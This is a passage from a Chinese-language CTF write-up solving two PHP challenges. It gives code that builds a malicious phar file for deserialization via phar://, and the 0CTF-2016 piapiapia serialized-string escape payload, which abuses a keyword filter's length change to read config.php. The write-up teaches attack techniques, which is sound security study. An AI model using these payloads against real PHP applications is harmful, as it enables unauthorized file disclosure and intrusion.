<li>于是下载网页源码，index.php，class.php，delete.php，ownload.php<br>注意到class.php中的Filelist类中的__destruct可以读取任意文件:<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public function __destruct() &#123;</span><br><span class="line">        $table = &apos;&lt;div id=&quot;container&quot; class=&quot;container&quot;&gt;&lt;div class=&quot;table-responsive&quot;&gt;&lt;table id=&quot;table&quot; class=&quot;table table-bordered table-hover sm-font&quot;&gt;&apos;;</span><br><span class="line">        $table .= &apos;&lt;thead&gt;&lt;tr&gt;&apos;;</span><br><span class="line">        foreach ($this-&gt;funcs as $func) &#123;</span><br><span class="line">            $table .= &apos;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;&apos; . htmlentities($func) . &apos;&lt;/th&gt;&apos;;</span><br><span class="line">        &#125;</span><br><span class="line">        $table .= &apos;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;Opt&lt;/th&gt;&apos;;</span><br><span class="line">        $table .= &apos;&lt;/thead&gt;&lt;tbody&gt;&apos;;</span><br><span class="line">        foreach ($this-&gt;results as $filename =&gt; $result) &#123;</span><br><span class="line">            $table .= &apos;&lt;tr&gt;&apos;;</span><br><span class="line">            foreach ($result as $func =&gt; $value) &#123;</span><br><span class="line">                $table .= &apos;&lt;td class=&quot;text-center&quot;&gt;&apos; . htmlentities($value) . &apos;&lt;/td&gt;&apos;;</span><br><span class="line">            &#125;</span><br><span class="line">            $table .= &apos;&lt;td class=&quot;text-center&quot; filename=&quot;&apos; . htmlentities($filename) . &apos;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;download&quot;&gt;下载&lt;/a&gt; / &lt;a href=&quot;#&quot; class=&quot;delete&quot;&gt;删除&lt;/a&gt;&lt;/td&gt;&apos;;</span><br><span class="line">            $table .= &apos;&lt;/tr&gt;&apos;;</span><br><span class="line">        &#125;</span><br><span class="line">        echo $table;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>class.php中的delete函数使用了unlink函数:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public function detele() &#123;</span><br><span class="line">       unlink($this-&gt;filename);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>而delete.php中又调用了delete函数:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">include &quot;class.php&quot;;</span><br><span class="line"></span><br><span class="line">chdir($_SESSION[&apos;sandbox&apos;]);</span><br><span class="line">$file = new File();</span><br><span class="line">$filename = (string) $_POST[&apos;filename&apos;];</span><br><span class="line">if (strlen($filename) &lt; 40 &amp;&amp; $file-&gt;open($filename)) &#123;</span><br><span class="line">    $file-&gt;detele();</span><br><span class="line">    Header(&quot;Content-type: application/json&quot;);</span><br><span class="line">    $response = array(&quot;success&quot; =&gt; true, &quot;error&quot; =&gt; &quot;&quot;);</span><br><span class="line">    echo json_encode($response);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    Header(&quot;Content-type: application/json&quot;);</span><br><span class="line">    $response = array(&quot;success&quot; =&gt; false, &quot;error&quot; =&gt; &quot;File not exist&quot;);</span><br><span class="line">    echo json_encode($response);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>生成phar文件的php代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    class User &#123;</span><br><span class="line">        public $db;</span><br><span class="line">    &#125; </span><br><span class="line">    class File&#123;</span><br><span class="line">        public $filename;</span><br><span class="line">        public function __construct($name)&#123;</span><br><span class="line">            $this-&gt;filename=$name;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    class FileList &#123;</span><br><span class="line">        private $files;</span><br><span class="line">        public function __construct()&#123;</span><br><span class="line">            $this-&gt;files=array(new File(&apos;/flag.txt&apos;));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line">    $o = new User();</span><br><span class="line">    $o-&gt;db =new FileList();</span><br><span class="line">    @unlink(&quot;phar.phar&quot;);</span><br><span class="line">    $phar = new Phar(&quot;phar.phar&quot;);</span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);</span><br><span class="line">    $phar-&gt;setMetadata($o);</span><br><span class="line">    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); </span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>之后将生成的phar文件后缀改为jpg上传。<br>接下来再点击删除文件，将文件名改为phar://phar.jpg即可获得flag.</p>
<h1 id="0CTF-2016-piapiapia-php反序列化长度变化尾部字符串逃逸"><a href="#0CTF-2016-piapiapia-php反序列化长度变化尾部字符串逃逸" class="headerlink" title="0CTF-2016-piapiapia(php反序列化长度变化尾部字符串逃逸)"></a>0CTF-2016-piapiapia(php反序列化长度变化尾部字符串逃逸)</h1><ul>
<li>进行一下目录扫描，发现源码泄露<a href="http://www.zip，把源码给出：" target="_blank" rel="noopener">www.zip，把源码给出：</a><br>index.php:<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	require_once(&apos;class.php&apos;);</span><br><span class="line">	if($_SESSION[&apos;username&apos;]) &#123;</span><br><span class="line">		header(&apos;Location: profile.php&apos;);</span><br><span class="line">		exit;</span><br><span class="line">	&#125;</span><br><span class="line">	if($_POST[&apos;username&apos;] &amp;&amp; $_POST[&apos;password&apos;]) &#123;</span><br><span class="line">		$username = $_POST[&apos;username&apos;];</span><br><span class="line">		$password = $_POST[&apos;password&apos;];</span><br><span class="line"></span><br><span class="line">		if(strlen($username) &lt; 3 or strlen($username) &gt; 16) </span><br><span class="line">			die(&apos;Invalid user name&apos;);</span><br><span class="line"></span><br><span class="line">		if(strlen($password) &lt; 3 or strlen($password) &gt; 16) </span><br><span class="line">			die(&apos;Invalid password&apos;);</span><br><span class="line"></span><br><span class="line">		if($user-&gt;login($username, $password)) &#123;</span><br><span class="line">			$_SESSION[&apos;username&apos;] = $username;</span><br><span class="line">			header(&apos;Location: profile.php&apos;);</span><br><span class="line">			exit;	</span><br><span class="line">		&#125;</span><br><span class="line">		else &#123;</span><br><span class="line">			die(&apos;Invalid user name or password&apos;);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	else &#123;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">   &lt;title&gt;Login&lt;/title&gt;</span><br><span class="line">   &lt;link href=&quot;static/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;</span><br><span class="line">   &lt;script src=&quot;static/jquery.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">   &lt;script src=&quot;static/bootstrap.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;div class=&quot;container&quot; style=&quot;margin-top:100px&quot;&gt;  </span><br><span class="line">		&lt;form action=&quot;index.php&quot; method=&quot;post&quot; class=&quot;well&quot; style=&quot;width:220px;margin:0px auto;&quot;&gt; </span><br><span class="line">			&lt;img src=&quot;static/piapiapia.gif&quot; class=&quot;img-memeda &quot; style=&quot;width:180px;margin:0px auto;&quot;&gt;</span><br><span class="line">			&lt;h3&gt;Login&lt;/h3&gt;</span><br><span class="line">			&lt;label&gt;Username:&lt;/label&gt;</span><br><span class="line">			&lt;input type=&quot;text&quot; name=&quot;username&quot; style=&quot;height:30px&quot;class=&quot;span3&quot;/&gt;</span><br><span class="line">			&lt;label&gt;Password:&lt;/label&gt;</span><br><span class="line">			&lt;input type=&quot;password&quot; name=&quot;password&quot; style=&quot;height:30px&quot; class=&quot;span3&quot;&gt;</span><br><span class="line"></span><br><span class="line">			&lt;button type=&quot;submit&quot; class=&quot;btn btn-primary&quot;&gt;LOGIN&lt;/button&gt;</span><br><span class="line">		&lt;/form&gt;</span><br><span class="line">	&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>在输入账号密码之后进入了profile.php，下面是profile.php的源码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	require_once(&apos;class.php&apos;);</span><br><span class="line">	if($_SESSION[&apos;username&apos;] == null) &#123;</span><br><span class="line">		die(&apos;Login First&apos;);	</span><br><span class="line">	&#125;</span><br><span class="line">	$username = $_SESSION[&apos;username&apos;];</span><br><span class="line">	$profile=$user-&gt;show_profile($username);</span><br><span class="line">	if($profile  == null) &#123;</span><br><span class="line">		header(&apos;Location: update.php&apos;);</span><br><span class="line">	&#125;</span><br><span class="line">	else &#123;</span><br><span class="line">		$profile = unserialize($profile);</span><br><span class="line">		$phone = $profile[&apos;phone&apos;];</span><br><span class="line">		$email = $profile[&apos;email&apos;];</span><br><span class="line">		$nickname = $profile[&apos;nickname&apos;];</span><br><span class="line">		$photo = base64_encode(file_get_contents($profile[&apos;photo&apos;]));</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">   &lt;title&gt;Profile&lt;/title&gt;</span><br><span class="line">   &lt;link href=&quot;static/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;</span><br><span class="line">   &lt;script src=&quot;static/jquery.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">   &lt;script src=&quot;static/bootstrap.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;div class=&quot;container&quot; style=&quot;margin-top:100px&quot;&gt;  </span><br><span class="line">		&lt;img src=&quot;data:image/gif;base64,&lt;?php echo $photo; ?&gt;&quot; class=&quot;img-memeda &quot; style=&quot;width:180px;margin:0px auto;&quot;&gt;</span><br><span class="line">		&lt;h3&gt;Hi &lt;?php echo $nickname;?&gt;&lt;/h3&gt;</span><br><span class="line">		&lt;label&gt;Phone: &lt;?php echo $phone;?&gt;&lt;/label&gt;</span><br><span class="line">		&lt;label&gt;Email: &lt;?php echo $email;?&gt;&lt;/label&gt;</span><br><span class="line">	&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>还有注册页面的源码(没有太大用)，register.php：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	require_once(&apos;class.php&apos;);</span><br><span class="line">	if($_POST[&apos;username&apos;] &amp;&amp; $_POST[&apos;password&apos;]) &#123;</span><br><span class="line">		$username = $_POST[&apos;username&apos;];</span><br><span class="line">		$password = $_POST[&apos;password&apos;];</span><br><span class="line"></span><br><span class="line">		if(strlen($username) &lt; 3 or strlen($username) &gt; 16) </span><br><span class="line">			die(&apos;Invalid user name&apos;);</span><br><span class="line"></span><br><span class="line">		if(strlen($password) &lt; 3 or strlen($password) &gt; 16) </span><br><span class="line">			die(&apos;Invalid password&apos;);</span><br><span class="line">		if(!$user-&gt;is_exists($username)) &#123;</span><br><span class="line">			$user-&gt;register($username, $password);</span><br><span class="line">			echo &apos;Register OK!&lt;a href=&quot;index.php&quot;&gt;Please Login&lt;/a&gt;&apos;;		</span><br><span class="line">		&#125;</span><br><span class="line">		else &#123;</span><br><span class="line">			die(&apos;User name Already Exists&apos;);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	else &#123;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">   &lt;title&gt;Login&lt;/title&gt;</span><br><span class="line">   &lt;link href=&quot;static/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;</span><br><span class="line">   &lt;script src=&quot;static/jquery.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">   &lt;script src=&quot;static/bootstrap.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;div class=&quot;container&quot; style=&quot;margin-top:100px&quot;&gt;  </span><br><span class="line">		&lt;form action=&quot;register.php&quot; method=&quot;post&quot; class=&quot;well&quot; style=&quot;width:220px;margin:0px auto;&quot;&gt; </span><br><span class="line">			&lt;img src=&quot;static/piapiapia.gif&quot; class=&quot;img-memeda &quot; style=&quot;width:180px;margin:0px auto;&quot;&gt;</span><br><span class="line">			&lt;h3&gt;Register&lt;/h3&gt;</span><br><span class="line">			&lt;label&gt;Username:&lt;/label&gt;</span><br><span class="line">			&lt;input type=&quot;text&quot; name=&quot;username&quot; style=&quot;height:30px&quot;class=&quot;span3&quot;/&gt;</span><br><span class="line">			&lt;label&gt;Password:&lt;/label&gt;</span><br><span class="line">			&lt;input type=&quot;password&quot; name=&quot;password&quot; style=&quot;height:30px&quot; class=&quot;span3&quot;&gt;</span><br><span class="line"></span><br><span class="line">			&lt;button type=&quot;submit&quot; class=&quot;btn btn-primary&quot;&gt;REGISTER&lt;/button&gt;</span><br><span class="line">		&lt;/form&gt;</span><br><span class="line">	&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>然后是update.php：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	require_once(&apos;class.php&apos;);</span><br><span class="line">	if($_SESSION[&apos;username&apos;] == null) &#123;</span><br><span class="line">		die(&apos;Login First&apos;);	</span><br><span class="line">	&#125;</span><br><span class="line">	if($_POST[&apos;phone&apos;] &amp;&amp; $_POST[&apos;email&apos;] &amp;&amp; $_POST[&apos;nickname&apos;] &amp;&amp; $_FILES[&apos;photo&apos;]) &#123;</span><br><span class="line"></span><br><span class="line">		$username = $_SESSION[&apos;username&apos;];</span><br><span class="line">		if(!preg_match(&apos;/^\d&#123;11&#125;$/&apos;, $_POST[&apos;phone&apos;]))</span><br><span class="line">			die(&apos;Invalid phone&apos;);</span><br><span class="line"></span><br><span class="line">		if(!preg_match(&apos;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/&apos;, $_POST[&apos;email&apos;]))</span><br><span class="line">			die(&apos;Invalid email&apos;);</span><br><span class="line">		</span><br><span class="line">		if(preg_match(&apos;/[^a-zA-Z0-9_]/&apos;, $_POST[&apos;nickname&apos;]) || strlen($_POST[&apos;nickname&apos;]) &gt; 10)</span><br><span class="line">			die(&apos;Invalid nickname&apos;);</span><br><span class="line"></span><br><span class="line">		$file = $_FILES[&apos;photo&apos;];</span><br><span class="line">		if($file[&apos;size&apos;] &lt; 5 or $file[&apos;size&apos;] &gt; 1000000)</span><br><span class="line">			die(&apos;Photo size error&apos;);</span><br><span class="line"></span><br><span class="line">		move_uploaded_file($file[&apos;tmp_name&apos;], &apos;upload/&apos; . md5($file[&apos;name&apos;]));</span><br><span class="line">		$profile[&apos;phone&apos;] = $_POST[&apos;phone&apos;];</span><br><span class="line">		$profile[&apos;email&apos;] = $_POST[&apos;email&apos;];</span><br><span class="line">		$profile[&apos;nickname&apos;] = $_POST[&apos;nickname&apos;];</span><br><span class="line">		$profile[&apos;photo&apos;] = &apos;upload/&apos; . md5($file[&apos;name&apos;]);</span><br><span class="line"></span><br><span class="line">		$user-&gt;update_profile($username, serialize($profile));</span><br><span class="line">		echo &apos;Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;&apos;;</span><br><span class="line">	&#125;</span><br><span class="line">	else &#123;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">   &lt;title&gt;UPDATE&lt;/title&gt;</span><br><span class="line">   &lt;link href=&quot;static/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;</span><br><span class="line">   &lt;script src=&quot;static/jquery.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">   &lt;script src=&quot;static/bootstrap.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;div class=&quot;container&quot; style=&quot;margin-top:100px&quot;&gt;  </span><br><span class="line">		&lt;form action=&quot;update.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot; class=&quot;well&quot; style=&quot;width:220px;margin:0px auto;&quot;&gt; </span><br><span class="line">			&lt;img src=&quot;static/piapiapia.gif&quot; class=&quot;img-memeda &quot; style=&quot;width:180px;margin:0px auto;&quot;&gt;</span><br><span class="line">			&lt;h3&gt;Please Update Your Profile&lt;/h3&gt;</span><br><span class="line">			&lt;label&gt;Phone:&lt;/label&gt;</span><br><span class="line">			&lt;input type=&quot;text&quot; name=&quot;phone&quot; style=&quot;height:30px&quot;class=&quot;span3&quot;/&gt;</span><br><span class="line">			&lt;label&gt;Email:&lt;/label&gt;</span><br><span class="line">			&lt;input type=&quot;text&quot; name=&quot;email&quot; style=&quot;height:30px&quot;class=&quot;span3&quot;/&gt;</span><br><span class="line">			&lt;label&gt;Nickname:&lt;/label&gt;</span><br><span class="line">			&lt;input type=&quot;text&quot; name=&quot;nickname&quot; style=&quot;height:30px&quot; class=&quot;span3&quot;&gt;</span><br><span class="line">			&lt;label for=&quot;file&quot;&gt;Photo:&lt;/label&gt;</span><br><span class="line">			&lt;input type=&quot;file&quot; name=&quot;photo&quot; style=&quot;height:30px&quot;class=&quot;span3&quot;/&gt;</span><br><span class="line">			&lt;button type=&quot;submit&quot; class=&quot;btn btn-primary&quot;&gt;UPDATE&lt;/button&gt;</span><br><span class="line">		&lt;/form&gt;</span><br><span class="line">	&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>核心的处理代码，class.php：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">require(&apos;config.php&apos;);</span><br><span class="line"></span><br><span class="line">class user extends mysql&#123;</span><br><span class="line">	private $table = &apos;users&apos;;</span><br><span class="line"></span><br><span class="line">	public function is_exists($username) &#123;</span><br><span class="line">		$username = parent::filter($username);</span><br><span class="line"></span><br><span class="line">		$where = &quot;username = &apos;$username&apos;&quot;;</span><br><span class="line">		return parent::select($this-&gt;table, $where);</span><br><span class="line">	&#125;</span><br><span class="line">	public function register($username, $password) &#123;</span><br><span class="line">		$username = parent::filter($username);</span><br><span class="line">		$password = parent::filter($password);</span><br><span class="line"></span><br><span class="line">		$key_list = Array(&apos;username&apos;, &apos;password&apos;);</span><br><span class="line">		$value_list = Array($username, md5($password));</span><br><span class="line">		return parent::insert($this-&gt;table, $key_list, $value_list);</span><br><span class="line">	&#125;</span><br><span class="line">	public function login($username, $password) &#123;</span><br><span class="line">		$username = parent::filter($username);</span><br><span class="line">		$password = parent::filter($password);</span><br><span class="line"></span><br><span class="line">		$where = &quot;username = &apos;$username&apos;&quot;;</span><br><span class="line">		$object = parent::select($this-&gt;table, $where);</span><br><span class="line">		if ($object &amp;&amp; $object-&gt;password === md5($password)) &#123;</span><br><span class="line">			return true;</span><br><span class="line">		&#125; else &#123;</span><br><span class="line">			return false;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	public function show_profile($username) &#123;</span><br><span class="line">		$username = parent::filter($username);</span><br><span class="line"></span><br><span class="line">		$where = &quot;username = &apos;$username&apos;&quot;;</span><br><span class="line">		$object = parent::select($this-&gt;table, $where);</span><br><span class="line">		return $object-&gt;profile;</span><br><span class="line">	&#125;</span><br><span class="line">	public function update_profile($username, $new_profile) &#123;</span><br><span class="line">		$username = parent::filter($username);</span><br><span class="line">		$new_profile = parent::filter($new_profile);</span><br><span class="line"></span><br><span class="line">		$where = &quot;username = &apos;$username&apos;&quot;;</span><br><span class="line">		return parent::update($this-&gt;table, &apos;profile&apos;, $new_profile, $where);</span><br><span class="line">	&#125;</span><br><span class="line">	public function __tostring() &#123;</span><br><span class="line">		return __class__;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class mysql &#123;</span><br><span class="line">	private $link = null;</span><br><span class="line"></span><br><span class="line">	public function connect($config) &#123;</span><br><span class="line">		$this-&gt;link = mysql_connect(</span><br><span class="line">			$config[&apos;hostname&apos;],</span><br><span class="line">			$config[&apos;username&apos;], </span><br><span class="line">			$config[&apos;password&apos;]</span><br><span class="line">		);</span><br><span class="line">		mysql_select_db($config[&apos;database&apos;]);</span><br><span class="line">		mysql_query(&quot;SET sql_mode=&apos;strict_all_tables&apos;&quot;);</span><br><span class="line"></span><br><span class="line">		return $this-&gt;link;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	public function select($table, $where, $ret = &apos;*&apos;) &#123;</span><br><span class="line">		$sql = &quot;SELECT $ret FROM $table WHERE $where&quot;;</span><br><span class="line">		$result = mysql_query($sql, $this-&gt;link);</span><br><span class="line">		return mysql_fetch_object($result);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	public function insert($table, $key_list, $value_list) &#123;</span><br><span class="line">		$key = implode(&apos;,&apos;, $key_list);</span><br><span class="line">		$value = &apos;\&apos;&apos; . implode(&apos;\&apos;,\&apos;&apos;, $value_list) . &apos;\&apos;&apos;; </span><br><span class="line">		$sql = &quot;INSERT INTO $table ($key) VALUES ($value)&quot;;</span><br><span class="line">		return mysql_query($sql);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	public function update($table, $key, $value, $where) &#123;</span><br><span class="line">		$sql = &quot;UPDATE $table SET $key = &apos;$value&apos; WHERE $where&quot;;</span><br><span class="line">		return mysql_query($sql);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	public function filter($string) &#123;</span><br><span class="line">		$escape = array(&apos;\&apos;&apos;, &apos;\\\\&apos;);</span><br><span class="line">		$escape = &apos;/&apos; . implode(&apos;|&apos;, $escape) . &apos;/&apos;;</span><br><span class="line">		$string = preg_replace($escape, &apos;_&apos;, $string);</span><br><span class="line"></span><br><span class="line">		$safe = array(&apos;select&apos;, &apos;insert&apos;, &apos;update&apos;, &apos;delete&apos;, &apos;where&apos;);</span><br><span class="line">		$safe = &apos;/&apos; . implode(&apos;|&apos;, $safe) . &apos;/i&apos;;</span><br><span class="line">		return preg_replace($safe, &apos;hacker&apos;, $string);</span><br><span class="line">	&#125;</span><br><span class="line">	public function __tostring() &#123;</span><br><span class="line">		return __class__;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">session_start();</span><br><span class="line">$user = new user();</span><br><span class="line">$user-&gt;connect($config);</span><br></pre></td></tr></table></figure>

<p>最后是config.php：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$config[&apos;hostname&apos;] = &apos;127.0.0.1&apos;;</span><br><span class="line">	$config[&apos;username&apos;] = &apos;root&apos;;</span><br><span class="line">	$config[&apos;password&apos;] = &apos;&apos;;</span><br><span class="line">	$config[&apos;database&apos;] = &apos;&apos;;</span><br><span class="line">	$flag = &apos;&apos;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>看来flag就是在config.php中了，要想办法拿到config.php的内容了。然后就是代码审计了。<br>这个地方貌似有个文件读取的地方，在profile.php中：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">else &#123;</span><br><span class="line">		$profile = unserialize($profile);</span><br><span class="line">		$phone = $profile[&apos;phone&apos;];</span><br><span class="line">		$email = $profile[&apos;email&apos;];</span><br><span class="line">		$nickname = $profile[&apos;nickname&apos;];</span><br><span class="line">		$photo = base64_encode(file_get_contents($profile[&apos;photo&apos;]));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>上面还有个反序列化unserialize，感觉有戏，如果$profile[‘photo’]是config.php就可以读取到了，可以对photo进行操作的地方在update.php，有phone、email、nickname和photo这几个。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$profile = a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;12345678901&quot;;s:5:&quot;email&quot;;s:8:&quot;ss@q.com&quot;;s:8:&quot;nickname&quot;;s:8:&quot;sea_sand&quot;;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;s:39:&quot;upload/804f743824c0451b2f60d81b63b6a900&quot;;&#125;</span><br><span class="line">print_r(unserialize($profile));</span><br><span class="line"></span><br><span class="line">结果如下：</span><br><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [phone] =&gt; 12345678901</span><br><span class="line">    [email] =&gt; ss@q.com</span><br><span class="line">    [nickname] =&gt; sea_sand</span><br><span class="line">    [photo] =&gt; config.php</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>可以看到反序列化之后，最后面upload这一部分就没了，下面就是想办法把config.php塞进去了。</p>
<p>从数组顺序上看是和上面数组的顺序一样的，可以抓个包看下post顺序，那么最有可能的就是从nickname下手了。</p>
<p>在设置了$profile之后，用update_profile()函数进行处理：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public function update_profile($username, $new_profile) &#123;</span><br><span class="line">		$username = parent::filter($username);</span><br><span class="line">		$new_profile = parent::filter($new_profile);</span><br><span class="line"></span><br><span class="line">		$where = &quot;username = &apos;$username&apos;&quot;;</span><br><span class="line">		return parent::update($this-&gt;table, &apos;profile&apos;, $new_profile, $where);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>进行了过滤：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public function filter($string) &#123;</span><br><span class="line">		$escape = array(&apos;\&apos;&apos;, &apos;\\\\&apos;);</span><br><span class="line">		$escape = &apos;/&apos; . implode(&apos;|&apos;, $escape) . &apos;/&apos;;</span><br><span class="line">		$string = preg_replace($escape, &apos;_&apos;, $string);</span><br><span class="line"></span><br><span class="line">		$safe = array(&apos;select&apos;, &apos;insert&apos;, &apos;update&apos;, &apos;delete&apos;, &apos;where&apos;);</span><br><span class="line">		$safe = &apos;/&apos; . implode(&apos;|&apos;, $safe) . &apos;/i&apos;;</span><br><span class="line"></span><br><span class="line">		return preg_replace($safe, &apos;hacker&apos;, $string);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>有两个正则过滤，带上输入nickname时候有一个正则，总共三个过滤的地方，首先要绕过第一个输入时候的正则：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if(preg_match(&apos;/[^a-zA-Z0-9_]/&apos;, $_POST[&apos;nickname&apos;]) || strlen($_POST[&apos;nickname&apos;]) &gt; 10)</span><br><span class="line">			die(&apos;Invalid nickname&apos;);</span><br><span class="line">数组即可绕过：</span><br><span class="line">nickname[]=</span><br><span class="line"></span><br><span class="line">那么$profile就是这样了：</span><br><span class="line">$profile = a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;12345678901&quot;;s:5:&quot;email&quot;;s:8:&quot;ss@q.com&quot;;s:8:&quot;nickname&quot;;a:1:&#123;i:0;s:3:&quot;xxx&quot;&#125;;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;s:39:&quot;upload/804f743824c0451b2f60d81b63b6a900&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>后面的正则要怎么利用呢，可以看到如果我们输入的有where，会替换成hacker，这样的话长度就变了，序列化后的每个变量都是有长度的，那么反序列化会怎么处理呢？我们应该怎么构造呢？</p>
<p>数组绕过了第一个正则过滤之后，如果nickname最后面塞上”;}s:5:“photo”;s:10:“config.php”;}，一共是34个字符，如果利用正则替换34个where，不就可以把这34个给挤出去，后面的upload因为序列化串被我们闭合了也就没用了：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nickname[]=wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</span><br><span class="line"></span><br><span class="line">$profile = a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;12345678901&quot;;s:5:&quot;email&quot;;s:8:&quot;ss@q.com&quot;;s:8:&quot;nickname&quot;;a:1:&#123;i:0;s:204:&quot;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;s:39:&quot;upload/804f743824c0451b2f60d81b63b6a900&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>在where被正则匹配换成hacker之后，正好满足长度，然后后面的”};s:5:“photo”;s:10:“config.php”;}也就不是nickname的一部分了，被反序列化的时候就会被当成photo，就可以读取到config.php的内容了。</p>
